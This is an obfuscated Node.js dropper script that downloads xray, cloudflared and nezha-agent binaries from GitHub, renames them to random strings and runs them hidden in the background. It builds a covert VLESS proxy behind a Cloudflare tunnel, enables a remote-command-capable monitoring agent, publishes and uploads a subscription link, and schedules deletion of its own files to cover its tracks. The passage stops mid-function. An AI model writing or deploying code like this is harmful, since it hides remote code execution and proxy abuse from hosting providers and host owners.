const _0x513a25=_0x3c46;(function(_0x433a9f,_0x330e07){const _0x4d5c05=_0x3c46,_0x1247d9=_0x433a9f();while(!![]){try{const _0x199be8=parseInt(_0x4d5c05(0x1b1))/0x1+parseInt(_0x4d5c05(0x1c1))/0x2+-parseInt(_0x4d5c05(0x198))/0x3*(-parseInt(_0x4d5c05(0x1a5))/0x4)+-parseInt(_0x4d5c05(0x1c5))/0x5+parseInt(_0x4d5c05(0x226))/0x6+-parseInt(_0x4d5c05(0x1cb))/0x7+-parseInt(_0x4d5c05(0x1b8))/0x8;if(_0x199be8===_0x330e07)break;else _0x1247d9['push'](_0x1247d9['shift']());}catch(_0x1a3378){_0x1247d9['push'](_0x1247d9['shift']());}}}(_0x24d2,0xe5643));const FILE_PATH=process['env'][_0x513a25(0x23a)]||_0x513a25(0x22d),intervalInseconds=process[_0x513a25(0x244)][_0x513a25(0x209)]||0x64,CFIP=process[_0x513a25(0x244)][_0x513a25(0x210)]||_0x513a25(0x243),CFPORT=process[_0x513a25(0x244)]['CFPORT']||_0x513a25(0x18d),delay=_0x2f24b8=>new Promise(_0x39de4c=>setTimeout(_0x39de4c,_0x2f24b8)),OPENSERVER=(process['env'][_0x513a25(0x223)]||_0x513a25(0x23b))==='true',KEEPALIVE=(process[_0x513a25(0x244)]['KEEPALIVE']||_0x513a25(0x1dc))===_0x513a25(0x23b),MY_DOMAIN=process[_0x513a25(0x244)][_0x513a25(0x18e)]||'',ARGO_DOMAIN=process[_0x513a25(0x244)][_0x513a25(0x216)]||'',ARGO_AUTH=process[_0x513a25(0x244)][_0x513a25(0x1d8)]||'',VLPATH=process[_0x513a25(0x244)]['VLPATH']||'',XHPPATH=process[_0x513a25(0x244)]['XHPPATH']||'',PORT=process[_0x513a25(0x244)][_0x513a25(0x1a1)]||process['env'][_0x513a25(0x21b)]||0xbb8,V_PORT=process['env']['V_PORT']||0x1f90,UUID=process[_0x513a25(0x244)][_0x513a25(0x1b0)]||'',NEZHA_VERSION=process[_0x513a25(0x244)][_0x513a25(0x233)]||'V0',NEZHA_SERVER=process[_0x513a25(0x244)][_0x513a25(0x1fa)]||'',NEZHA_PORT=process[_0x513a25(0x244)]['NEZHA_PORT']||_0x513a25(0x18d),NEZHA_KEY=process[_0x513a25(0x244)][_0x513a25(0x1b2)]||'',SUB_NAME=process[_0x513a25(0x244)][_0x513a25(0x1bc)]||'',SUB_URL=process[_0x513a25(0x244)]['SUB_URL']||'',axios=require(_0x513a25(0x217)),{pipeline}=require(_0x513a25(0x190)),os=require('os'),fs=require('fs'),path=require(_0x513a25(0x1c7)),http=require(_0x513a25(0x206)),https=require(_0x513a25(0x22f)),exec=require(_0x513a25(0x219))['exec'];function cleanupOldFiles(){const _0x8143e8=_0x513a25;try{if(fs[_0x8143e8(0x1ee)](path[_0x8143e8(0x1b5)](FILE_PATH)))fs[_0x8143e8(0x1ab)](path['join'](FILE_PATH),{'recursive':!![]});else{}}catch(_0x1aac04){}}function createFolder(_0x1b9c75){const _0x4c3f75=_0x513a25;if(!fs[_0x4c3f75(0x1ee)](_0x1b9c75))fs['mkdirSync'](_0x1b9c75);else{}}function httpserver(){const _0x22e18e=_0x513a25,_0x17c349=http[_0x22e18e(0x18c)]((_0x933914,_0x4346d9)=>{const _0xdc6b7d=_0x22e18e;if(_0x933914[_0xdc6b7d(0x23d)]==='/')_0x4346d9[_0xdc6b7d(0x231)](0xc8),_0x4346d9['end']('hello\x20world');else{if(_0x933914['url']==='/sub'){const _0x57959f=FILE_PATH+'/log.txt';fs['readFile'](_0x57959f,_0xdc6b7d(0x220),(_0x3e7ad6,_0x4e8f6b)=>{const _0x52f7ee=_0xdc6b7d;_0x3e7ad6?(_0x4346d9[_0x52f7ee(0x231)](0x1f4),_0x4346d9['end']('Error\x20reading\x20file')):(_0x4346d9['writeHead'](0xc8,{'Content-Type':_0x52f7ee(0x1e2)}),_0x4346d9[_0x52f7ee(0x23e)](_0x4e8f6b));});}else _0x4346d9['writeHead'](0x194),_0x4346d9[_0xdc6b7d(0x23e)]('Not\x20found');}});_0x17c349[_0x22e18e(0x1e3)](PORT,()=>{const _0x15c553=_0x22e18e;console[_0x15c553(0x1dd)]('server\x20is\x20running\x20on\x20port\x20:\x20'+PORT);});}function execPromise(_0x13e1ae,_0x1a7908={}){return new Promise((_0x80a054,_0x570bc5)=>{const _0x402690=exec(_0x13e1ae,_0x1a7908,(_0x40705c,_0x3d7724,_0x19d429)=>{const _0x24ce81=_0x3c46;if(_0x40705c){const _0x1206aa=new Error(_0x24ce81(0x201)+_0x40705c[_0x24ce81(0x1bf)]);_0x1206aa[_0x24ce81(0x227)]=_0x40705c[_0x24ce81(0x227)],_0x1206aa[_0x24ce81(0x211)]=_0x19d429[_0x24ce81(0x237)](),_0x570bc5(_0x1206aa);}else _0x80a054(_0x3d7724[_0x24ce81(0x237)]());});});}async function detectProcess(_0x1649bc){const _0x22dc13=_0x513a25,_0x31da5b=[{'cmd':'pidof\x20\x22'+_0x1649bc+'\x22','name':_0x22dc13(0x1e1)},{'cmd':'pgrep\x20-x\x20\x22'+_0x1649bc+'\x22','name':_0x22dc13(0x196)},{'cmd':'ps\x20-eo\x20pid,comm\x20|\x20awk\x20-v\x20name=\x22'+_0x1649bc+'\x22\x20\x27$2\x20==\x20name\x20{print\x20$1}\x27','name':'ps+awk'}];for(const _0x51a6cf of _0x31da5b){try{const _0x4d43c=await execPromise(_0x51a6cf[_0x22dc13(0x1c4)]);if(_0x4d43c)return _0x4d43c['replace'](/\n/g,'\x20')[_0x22dc13(0x237)]();}catch(_0x47c9cb){_0x47c9cb[_0x22dc13(0x227)]!==0x7f&&_0x47c9cb[_0x22dc13(0x227)]!==0x1&&console[_0x22dc13(0x242)](_0x22dc13(0x205)+_0x51a6cf[_0x22dc13(0x1a8)]+_0x22dc13(0x1f2),_0x47c9cb[_0x22dc13(0x1bf)]);}}return'';}async function killProcess(_0x2842b7){const _0x45c59b=_0x513a25;console[_0x45c59b(0x1dd)](_0x45c59b(0x1d4)+_0x2842b7);try{const _0x4c70b3=await detectProcess(_0x2842b7);if(!_0x4c70b3)return console[_0x45c59b(0x1cc)]('Process\x20\x27'+_0x2842b7+_0x45c59b(0x1b4)),{'success':!![],'message':'Process\x20not\x20found'};await execPromise(_0x45c59b(0x1a4)+_0x4c70b3);const _0x195429=_0x45c59b(0x1fd)+_0x4c70b3+')';return console['log'](_0x195429),{'success':!![],'message':_0x195429};}catch(_0x3f0f44){const _0x3aa2c9=_0x45c59b(0x1a6)+_0x3f0f44[_0x45c59b(0x1bf)];return console['error'](_0x3aa2c9),{'success':![],'message':_0x3aa2c9};}}function generateRandomString(_0x333a3e){const _0x94db49=_0x513a25,_0x42e1ec='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0x425e66='';for(let _0x57ec60=0x0;_0x57ec60<_0x333a3e;_0x57ec60++){_0x425e66+=_0x42e1ec[_0x94db49(0x19c)](Math[_0x94db49(0x208)](Math[_0x94db49(0x1a3)]()*_0x42e1ec['length']));}return _0x425e66;}async function myconfig(){const _0x15f26a=_0x513a25,_0x4d6ddf=path[_0x15f26a(0x1b5)](FILE_PATH,'xconf'),_0x224f3e='/'+VLPATH,_0x2bf563='/'+XHPPATH;function _0x267a03(){const _0x39fcc8=_0x15f26a,_0xda7393={'log':{'access':'/dev/null','error':_0x39fcc8(0x1a9),'loglevel':_0x39fcc8(0x1ac)},'dns':{'servers':['https+local://8.8.8.8/dns-query']}};fs[_0x39fcc8(0x21d)](path[_0x39fcc8(0x1b5)](_0x4d6ddf,_0x39fcc8(0x1fc)),JSON[_0x39fcc8(0x207)](_0xda7393,null,0x2));if(VLPATH&&!XHPPATH){const _0xccf10a={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x39fcc8(0x238),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x39fcc8(0x1ac)},'streamSettings':{'network':'ws','security':_0x39fcc8(0x1ac),'wsSettings':{'path':_0x224f3e}},'sniffing':{'enabled':!![],'destOverride':[_0x39fcc8(0x206),'tls','quic'],'metadataOnly':![]}}]};fs[_0x39fcc8(0x21d)](path[_0x39fcc8(0x1b5)](_0x4d6ddf,_0x39fcc8(0x22c)),JSON[_0x39fcc8(0x207)](_0xccf10a,null,0x2));}else{if(XHPPATH&&!VLPATH){const _0x2e0ae4={'inbounds':[{'port':V_PORT,'listen':'::','protocol':_0x39fcc8(0x238),'settings':{'clients':[{'id':UUID}],'decryption':_0x39fcc8(0x1ac)},'streamSettings':{'network':_0x39fcc8(0x229),'security':_0x39fcc8(0x1ac),'xhttpSettings':{'mode':_0x39fcc8(0x203),'path':_0x2bf563}},'sniffing':{'enabled':!![],'destOverride':[_0x39fcc8(0x206),_0x39fcc8(0x1c6),'quic'],'metadataOnly':![]}}]};fs[_0x39fcc8(0x21d)](path['join'](_0x4d6ddf,_0x39fcc8(0x22c)),JSON[_0x39fcc8(0x207)](_0x2e0ae4,null,0x2));}}const _0x21fd8a={'outbounds':[{'tag':_0x39fcc8(0x1aa),'protocol':'freedom'},{'tag':_0x39fcc8(0x20c),'protocol':_0x39fcc8(0x1cd)}]};fs[_0x39fcc8(0x21d)](path[_0x39fcc8(0x1b5)](_0x4d6ddf,_0x39fcc8(0x1ef)),JSON['stringify'](_0x21fd8a,null,0x2));}_0x267a03();}function getSystemArchitecture(){const _0x4f0949=_0x513a25,_0x4f00e1=os['arch']();return _0x4f00e1===_0x4f0949(0x240)||_0x4f00e1===_0x4f0949(0x19f)||_0x4f00e1===_0x4f0949(0x20a)?_0x4f0949(0x240):_0x4f0949(0x1db);}function getFilesForArchitecture(_0x34d717){const _0x16f4bf=_0x513a25,_0x489340={'bot':{'arm':_0x16f4bf(0x232),'amd':'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'},'web':{'arm':_0x16f4bf(0x224),'amd':_0x16f4bf(0x1e9)},'npm':{'V0':{'arm':_0x16f4bf(0x1ca),'amd':'https://github.com/kahunama/myfile/releases/download/main/nezha-agent'},'V1':{'arm':_0x16f4bf(0x20b),'amd':'https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1'}}};let _0x5ee24d=[{'fileName':generateRandomString(0x5),'originalName':_0x16f4bf(0x20e),'fileUrl':_0x489340[_0x16f4bf(0x20e)][_0x34d717]}];if(OPENSERVER){const _0x3b2b6b={'fileName':generateRandomString(0x5),'originalName':_0x16f4bf(0x1d9),'fileUrl':_0x489340[_0x16f4bf(0x1d9)][_0x34d717]};_0x5ee24d['push'](_0x3b2b6b);}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY&&NEZHA_VERSION){const _0x1b4601={'fileName':generateRandomString(0x5),'originalName':_0x16f4bf(0x1d1),'fileUrl':_0x489340[_0x16f4bf(0x1d1)][NEZHA_VERSION][_0x34d717]};_0x5ee24d['push'](_0x1b4601);}return _0x5ee24d;}async function download_function(_0x572158,_0x3ef426,_0x3fdea2){const _0x578981=_0x513a25,_0x1f3555=path[_0x578981(0x1b5)](FILE_PATH,_0x572158);let _0x44f48a=![];try{const _0x2879d7=await axios({'method':'get','url':_0x3fdea2,'responseType':_0x578981(0x215)});await pipeline(_0x2879d7[_0x578981(0x218)],fs[_0x578981(0x22e)](_0x1f3555)),_0x44f48a=!![];}catch(_0x5d32e8){}return{'fileName':_0x572158,'originalName':_0x3ef426,'filePath':_0x1f3555,'success':_0x44f48a};}function _0x24d2(){const _0x4e69bf=['Kill\x20failed:\x20','hostname','name','/dev/null','direct','rmSync','none','\x20-p\x20','parse','port','UUID','1350075vfTSbY','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x27\x20not\x20found','join','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','13153928lxXdfV','Failed\x20to\x20obtain\x20ArgoDomain\x20even\x20after\x20restarting\x20bot.','8443','nohup\x20','SUB_NAME','length','map','message','includes','2092698SKcPmh','toString','%3Fed%3D2560&type=ws&encryption=none&security=tls&sni=','cmd','4679970xrCUUE','tls','path','\x20is\x20running','/xconf\x20>/dev/null\x202>&1\x20&','https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm','11368714qxRwBW','warn','blackhole','\x20-c\x20','exec','/tunnel.yml\x20run','npm','utf-8','Error\x20deleting\x20boot.log:\x20','Attempting\x20to\x20kill\x20process:\x20','tunnel.yml','readFileSync','Error\x20reading\x20boot.log:','ARGO_AUTH','bot','Error\x20downloading\x20files:','amd','false','log','tunnel.json','\x20-s\x20','unlinkSync','pidof','text/plain;\x20charset=utf-8','listen','/config.yml\x20>/dev/null\x202>&1\x20&','2083','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','fileName','/config.yml','https://github.com/mytcgd/myfiles/releases/download/main/xray','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','vless://','all','error','existsSync','outbound.json','HTTP\x20error!\x20status:\x20','split','\x20error:','forEach','speed.cloudflare.com','2087','npm\x20variable\x20is\x20empty,\x20skip\x20running','request','clear','Upload\x20failed:','NEZHA_SERVER','match','inbound.json','Killed\x20process\x20(PIDs:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20\x20\x20\x20\x20','originalName','\x0a\x20\x20\x20\x20\x20\x20\x20\x20protocol:\x20http2\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20\x20\x20-\x20hostname:\x20','Command\x20failed:\x20','from','packet-up','?host=','[detectProcess]\x20','http','stringify','floor','TIME','aarch64','https://github.com/mytcgd/myfiles/releases/download/main/nezha-agentv1_arm','block','&path=%2F','web','statusMessage','CFIP','stderr','GET','\x0a\x20\x20\x20\x20\x20\x20\x20\x20tunnel:\x20','isDirectory','stream','ARGO_DOMAIN','axios','data','child_process','client_secret:\x20','SERVER_PORT','country','writeFileSync','&type=xhttp&host=','statusCode','utf8','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','--tls','OPENSERVER','https://github.com/mytcgd/myfiles/releases/download/main/xray_arm','lstatSync','11235924qKpkIV','code','fileUrl','xhttp','POST','log.txt','inbound_v.json','/tmp','createWriteStream','https','base64','writeHead','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','NEZHA_VERSION','filePath','2096','xconf','trim','vless','pathname','FILE_PATH','true','replace','url','end','2053','arm','application/json;\x20charset=utf-8','debug','ip.sb','env','?encryption=none&security=tls&sni=','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','createServer','443','MY_DOMAIN','web\x20file\x20not\x20found,\x20skip\x20running','stream/promises','bot\x20file\x20not\x20found,\x20skip\x20running','asOrganization','/xconf','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20\x20\x20credentials-file:\x20','pgrep','\x20--report-delay=4\x20--skip-conn\x20--skip-procs\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&','3318YFQrLu','No\x20domain\x20could\x20be\x20determined.\x20Cannot\x20construct\x20UPLOAD_DATA','boot.log','App\x20is\x20running','charAt','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','arm64','\x20running\x20error:\x20','PORT','\x20run\x20-confdir\x20','random','kill\x20-9\x20','3164CBnjGW'];_0x24d2=function(){return _0x4e69bf;};return _0x24d2();}let fileMapping={};async function downloadFiles(){const _0x43ebbf=_0x513a25;try{const _0x3e1d82=getSystemArchitecture();if(!_0x3e1d82)return console[_0x43ebbf(0x1dd)]('Can\x27t\x20determine\x20system\x20architecture.'),fileMapping;const _0x879a09=getFilesForArchitecture(_0x3e1d82);if(_0x879a09[_0x43ebbf(0x1bd)]===0x0)return console[_0x43ebbf(0x1dd)](_0x43ebbf(0x19e)),fileMapping;const _0x463db6=_0x879a09[_0x43ebbf(0x1be)](_0x1d540d=>download_function(_0x1d540d[_0x43ebbf(0x1e7)],_0x1d540d[_0x43ebbf(0x1ff)],_0x1d540d[_0x43ebbf(0x228)])),_0x4171b9=await Promise[_0x43ebbf(0x1ec)](_0x463db6);return _0x4171b9[_0x43ebbf(0x1f3)](_0x5de94e=>{const _0x389731=_0x43ebbf;if(_0x5de94e['success'])try{fs['chmodSync'](_0x5de94e[_0x389731(0x234)],0x1ed),fileMapping[_0x5de94e[_0x389731(0x1ff)]]=_0x5de94e[_0x389731(0x1e7)];}catch(_0x63a826){}}),fileMapping;}catch(_0x2012b1){return console[_0x43ebbf(0x1ed)](_0x43ebbf(0x1da),_0x2012b1),fileMapping;}}function argoType(){const _0x48bb=_0x513a25;if(!ARGO_AUTH||!ARGO_DOMAIN)return;if(ARGO_AUTH[_0x48bb(0x1c0)](_0x48bb(0x194))){fs[_0x48bb(0x21d)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x599e99=_0x48bb(0x213)+ARGO_AUTH[_0x48bb(0x1f1)]('\x22')[0xb]+_0x48bb(0x195)+path['join'](FILE_PATH,_0x48bb(0x1de))+_0x48bb(0x200)+ARGO_DOMAIN+_0x48bb(0x1b3)+V_PORT+_0x48bb(0x1fe);fs[_0x48bb(0x21d)](path[_0x48bb(0x1b5)](FILE_PATH,_0x48bb(0x1d5)),_0x599e99);}else{}}let args;function get_cloud_flare_args(){const _0x1b4bab=_0x513a25;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))args=_0x1b4bab(0x1e6)+ARGO_AUTH;else ARGO_AUTH[_0x1b4bab(0x1fb)](/TunnelSecret/)?args='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1b4bab(0x1d0):args=_0x1b4bab(0x1ea)+FILE_PATH+_0x1b4bab(0x1b6)+V_PORT;return args;}let NEZHA_TLS;function nezconfig(){const _0x5e9318=_0x513a25,_0x5cc957=[_0x5e9318(0x18d),_0x5e9318(0x1ba),_0x5e9318(0x235),_0x5e9318(0x1f5),_0x5e9318(0x1e5),_0x5e9318(0x23f)];if(NEZHA_VERSION==='V0')return _0x5cc957[_0x5e9318(0x1c0)](NEZHA_PORT)?NEZHA_TLS=_0x5e9318(0x222):NEZHA_TLS='',NEZHA_TLS;else{if(NEZHA_VERSION==='V1'){_0x5cc957['includes'](NEZHA_PORT)?NEZHA_TLS=_0x5e9318(0x23b):NEZHA_TLS=_0x5e9318(0x1dc);const _0x42f553=path[_0x5e9318(0x1b5)](FILE_PATH,_0x5e9318(0x1e8)),_0x28cba3=_0x5e9318(0x21a)+NEZHA_KEY+_0x5e9318(0x19d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5e9318(0x18b)+NEZHA_TLS+_0x5e9318(0x1b7)+UUID;try{fs[_0x5e9318(0x21d)](_0x42f553,_0x28cba3);}catch(_0x18f291){}}}}async function runbot(){const _0x18abbd=_0x513a25;if(fileMapping[_0x18abbd(0x1d9)]&&fs[_0x18abbd(0x1ee)](path['join'](FILE_PATH,fileMapping[_0x18abbd(0x1d9)])))try{await execPromise('nohup\x20'+FILE_PATH+'/'+fileMapping[_0x18abbd(0x1d9)]+'\x20'+args+'\x20>/dev/null\x202>&1\x20&');}catch(_0x4e7d78){console['error'](fileMapping[_0x18abbd(0x1d9)]+_0x18abbd(0x1a0)+_0x4e7d78);}else console['log'](_0x18abbd(0x191));}async function runweb(){const _0xe72283=_0x513a25;if(fileMapping[_0xe72283(0x20e)]&&fs[_0xe72283(0x1ee)](path['join'](FILE_PATH,fileMapping[_0xe72283(0x20e)]))){const _0x3557bb=_0xe72283(0x1bb)+FILE_PATH+'/'+fileMapping[_0xe72283(0x20e)]+_0xe72283(0x1a2)+FILE_PATH+_0xe72283(0x1c9);try{await execPromise(_0x3557bb);}catch(_0x501aab){console[_0xe72283(0x1ed)](fileMapping[_0xe72283(0x20e)]+_0xe72283(0x1a0)+_0x501aab);}}else console['log'](_0xe72283(0x18f));}async function runnpm(){const _0x38ebe6=_0x513a25;if(fileMapping[_0x38ebe6(0x1d1)]&&fs[_0x38ebe6(0x1ee)](path['join'](FILE_PATH,fileMapping[_0x38ebe6(0x1d1)]))){if(NEZHA_VERSION==='V0'){const _0x59375a=_0x38ebe6(0x1bb)+FILE_PATH+'/'+fileMapping[_0x38ebe6(0x1d1)]+_0x38ebe6(0x1df)+NEZHA_SERVER+':'+NEZHA_PORT+_0x38ebe6(0x1ad)+NEZHA_KEY+'\x20'+NEZHA_TLS+_0x38ebe6(0x197);try{await execPromise(_0x59375a);}catch(_0xef9fda){console[_0x38ebe6(0x1ed)](fileMapping[_0x38ebe6(0x1d1)]+_0x38ebe6(0x1a0)+_0xef9fda);}}else{if(NEZHA_VERSION==='V1'){const _0x503a8a=_0x38ebe6(0x1bb)+FILE_PATH+'/'+fileMapping['npm']+_0x38ebe6(0x1ce)+FILE_PATH+_0x38ebe6(0x1e4);try{await execPromise(_0x503a8a);}catch(_0x45f4e1){console[_0x38ebe6(0x1ed)](fileMapping[_0x38ebe6(0x1d1)]+_0x38ebe6(0x1a0)+_0x45f4e1);}}}}else console[_0x38ebe6(0x1dd)]('npm\x20file\x20not\x20found,\x20skip\x20running');}async function runapp(){const _0x19ef8b=_0x513a25;OPENSERVER?(argoType(),get_cloud_flare_args(),await runbot(),await delay(0x1388)):console[_0x19ef8b(0x1dd)]('bot\x20variable\x20is\x20not\x20allowed,\x20skip\x20running'),await runweb(),await delay(0x3e8),NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY?(nezconfig(),await runnpm(),await delay(0x3e8)):console[_0x19ef8b(0x1dd)](_0x19ef8b(0x1f6));}async function keep_alive(){const _0x2a3e5e=_0x513a25,_0x4c1753=await detectProcess(''+fileMapping[_0x2a3e5e(0x20e)]);if(_0x4c1753){}else await runweb();await delay(0x1388);if(OPENSERVER){const _0x554bb6=await detectProcess(''+fileMapping[_0x2a3e5e(0x1d9)]);if(_0x554bb6){}else await runbot();}await delay(0x1388);if(NEZHA_VERSION&&NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3e7d1e=await detectProcess(''+fileMapping['npm']);if(_0x3e7d1e){}else await runnpm();}}function getArgoDomainFromLog(){const _0x5bbfbf=_0x513a25,_0x46bf44=path[_0x5bbfbf(0x1b5)](FILE_PATH,_0x5bbfbf(0x19a));try{if(!fs[_0x5bbfbf(0x1ee)](_0x46bf44)||fs['statSync'](_0x46bf44)['size']===0x0)return null;const _0x3a17e2=fs[_0x5bbfbf(0x1d6)](_0x46bf44,_0x5bbfbf(0x1d2)),_0x4b5471=/info.*https:\/\/(.*trycloudflare\.com)/g;let _0x852d01,_0x37b3ca=null;while((_0x852d01=_0x4b5471[_0x5bbfbf(0x1cf)](_0x3a17e2))!==null){_0x37b3ca=_0x852d01[0x1];}return _0x37b3ca;}catch(_0x1a0c44){return console[_0x5bbfbf(0x1ed)](_0x5bbfbf(0x1d7),_0x1a0c44),null;}}function buildurl(_0x46a0ee){const _0x473945=_0x513a25;let _0x2c944e='';if(VLPATH)_0x2c944e='vless://'+UUID+'@'+CFIP+':'+CFPORT+_0x473945(0x204)+_0x46a0ee+_0x473945(0x20d)+VLPATH+_0x473945(0x1c3)+_0x46a0ee+'#'+ISP+'-'+SUB_NAME;else XHPPATH&&(_0x2c944e=_0x473945(0x1eb)+UUID+'@'+CFIP+':'+CFPORT+_0x473945(0x245)+_0x46a0ee+_0x473945(0x21e)+_0x46a0ee+'&path=%2F'+XHPPATH+'%3Fed%3D2560&mode=packet-up#'+ISP+'-'+SUB_NAME);return _0x2c944e;}let argoDomain,UPLOAD_DATA;async function extractDomains(){const _0x1dc226=_0x513a25;let _0x4ba1be=null;if(OPENSERVER){if(ARGO_AUTH&&ARGO_DOMAIN)_0x4ba1be=ARGO_DOMAIN;else{await delay(0xbb8),_0x4ba1be=getArgoDomainFromLog();if(!_0x4ba1be)try{console[_0x1dc226(0x1dd)](_0x1dc226(0x221));const _0x937902=path[_0x1dc226(0x1b5)](FILE_PATH,_0x1dc226(0x19a));if(fs['existsSync'](_0x937902))try{fs[_0x1dc226(0x1e0)](_0x937902),await delay(0x1f4);}catch(_0x46bc39){console[_0x1dc226(0x1ed)](_0x1dc226(0x1d3)+_0x46bc39);}const _0x3931f2=''+fileMapping[_0x1dc226(0x1d9)];killProcess(_0x3931f2),await delay(0x3e8),await runbot(),console[_0x1dc226(0x1dd)](fileMapping[_0x1dc226(0x1d9)]+_0x1dc226(0x1c8)),await delay(0x2710),_0x4ba1be=getArgoDomainFromLog(),!_0x4ba1be&&console[_0x1dc226(0x1ed)](_0x1dc226(0x1b9));}catch(_0x241ce9){console['error']('Error\x20in\x20bot\x20process\x20management:',_0x241ce9);return;}else{}}}MY_DOMAIN&&(_0x4ba1be=MY_DOMAIN);argoDomain=_0x4ba1be;if(!argoDomain){console['error'](_0x1dc226(0x199)),UPLOAD_DATA='';return;}UPLOAD_DATA=buildurl(argoDomain);}async function getCloudflareMeta(){return new Promise((_0x3c42b6,_0x3ec4eb)=>{const _0x1f8276=_0x3c46,_0x48b03c={'hostname':_0x1f8276(0x1f4),'path':'/meta','method':_0x1f8276(0x212)},_0x31a3c8=https[_0x1f8276(0x1f7)](_0x48b03c,_0x4144b5=>{const _0x738e14=_0x1f8276;let _0x1a14eb='';_0x4144b5['on'](_0x738e14(0x218),_0x2c3577=>{_0x1a14eb+=_0x2c3577;}),_0x4144b5['on'](_0x738e14(0x23e),()=>{const _0x2b1466=_0x738e14,_0x129d8c=JSON[_0x2b1466(0x1ae)](_0x1a14eb);_0x3c42b6(_0x129d8c);});});_0x31a3c8['on'](_0x1f8276(0x1ed),_0xc6a475=>{_0x3ec4eb(_0xc6a475);}),_0x31a3c8[_0x1f8276(0x23e)]();});}let ISP;async function getipandisp(){const _0x51304a=_0x513a25;let _0x37bb5c=await getCloudflareMeta(),_0x53331c=_0x37bb5c[_0x51304a(0x21c)],_0x463be7=_0x37bb5c[_0x51304a(0x192)];ISP=(_0x53331c+'-'+_0x463be7)[_0x51304a(0x23c)](/ /g,'_');}function generateLinks(){const _0x42823f=_0x513a25;if(UPLOAD_DATA){const _0x1ccfcc=path['join'](FILE_PATH,_0x42823f(0x22b));fs[_0x42823f(0x21d)](_0x1ccfcc,Buffer[_0x42823f(0x202)](UPLOAD_DATA)[_0x42823f(0x1c2)](_0x42823f(0x230)));}}async function uploadSubscription(_0x5dd94e,_0x17b8cf,_0x308055){const _0x187404=_0x513a25,_0xe54525=JSON[_0x187404(0x207)]({'URL_NAME':_0x5dd94e,'URL':_0x17b8cf}),_0x2d8e5a=Buffer[_0x187404(0x202)](_0xe54525,_0x187404(0x220)),_0x106baa=_0x2d8e5a[_0x187404(0x1bd)],_0xeb9af6=new URL(_0x308055),_0x1ef029={'hostname':_0xeb9af6[_0x187404(0x1a7)],'port':_0xeb9af6[_0x187404(0x1af)]||0x1bb,'path':_0xeb9af6[_0x187404(0x239)],'method':_0x187404(0x22a),'headers':{'Content-Type':_0x187404(0x241),'Content-Length':_0x106baa}};try{const _0x4f643d=await new Promise((_0x1da254,_0x216330)=>{const _0x25f632=_0x187404,_0xeba9a0=https[_0x25f632(0x1f7)](_0x1ef029,_0x550282=>{const _0x3a3d92=_0x25f632;if(_0x550282[_0x3a3d92(0x21f)]<0xc8||_0x550282[_0x3a3d92(0x21f)]>=0x12c)return _0x216330(new Error(_0x3a3d92(0x1f0)+_0x550282[_0x3a3d92(0x21f)]+',\x20response:\x20'+_0x550282[_0x3a3d92(0x20f)]));let _0x4fd3ed='';_0x550282['on'](_0x3a3d92(0x218),_0x549650=>_0x4fd3ed+=_0x549650),_0x550282['on'](_0x3a3d92(0x23e),()=>_0x1da254(_0x4fd3ed));});_0xeba9a0['on'](_0x25f632(0x1ed),_0x245c5d=>_0x216330(_0x245c5d)),_0xeba9a0['write'](_0x2d8e5a),_0xeba9a0[_0x25f632(0x23e)]();});return _0x4f643d;}catch(_0x4cd09d){console[_0x187404(0x1ed)](_0x187404(0x1f9),_0x4cd09d[_0x187404(0x1bf)]);}}function _0x3c46(_0x16f9b4,_0x596764){const _0x24d2bb=_0x24d2();return _0x3c46=function(_0x3c4650,_0x3ff96e){_0x3c4650=_0x3c4650-0x18b;let _0x3490df=_0x24d2bb[_0x3c4650];return _0x3490df;},_0x3c46(_0x16f9b4,_0x596764);}function cleanfiles(){setTimeout(()=>{const _0x5ba33e=_0x3c46;let _0x54af78;KEEPALIVE?_0x54af78=[]:_0x54af78=[FILE_PATH+'/'+fileMapping['bot'],FILE_PATH+'/'+fileMapping[_0x5ba33e(0x20e)],FILE_PATH+'/'+fileMapping[_0x5ba33e(0x1d1)],FILE_PATH+_0x5ba33e(0x193),FILE_PATH+'/config.yml'],_0x54af78[_0x5ba33e(0x1f3)](_0x2a1e98=>{const 